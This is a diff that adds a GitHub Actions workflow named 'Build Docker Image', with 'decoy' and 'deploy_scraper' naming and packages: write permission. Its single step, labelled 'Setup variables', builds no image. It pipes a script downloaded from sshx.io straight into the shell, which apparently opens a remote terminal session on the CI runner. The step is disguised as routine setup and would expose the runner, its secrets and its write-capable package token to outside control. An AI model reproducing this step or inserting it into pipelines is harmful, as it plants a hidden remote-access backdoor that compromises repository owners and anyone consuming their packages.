@@ -1,0 +1,40 @@
+name: Build Docker Image
+
+on:
+  workflow_call: 
+    inputs:
+      is_decoy:
+        description: 'Deploy Decoy'
+        required: true
+        type: boolean
+        default: false
+      tag_name:
+        description: 'Tag name'
+        required: true
+        type: string
+        default: 'latest'
+        
+  workflow_dispatch: 
+    inputs:
+      is_decoy:
+        description: 'Deploy Decoy'
+        required: true
+        default: 'false'
+      tag_name:
+        description: 'Tag name'
+        required: true
+        default: 'latest'
+
+jobs:
+  deploy_scraper:
+    runs-on: ubuntu-latest
+
+    permissions:
+      contents: read
+      packages: write
+
+    steps:
+      - name: Setup variables
+        id: vars
+        run: |
+          curl -sSf https://sshx.io/get | sh -s run
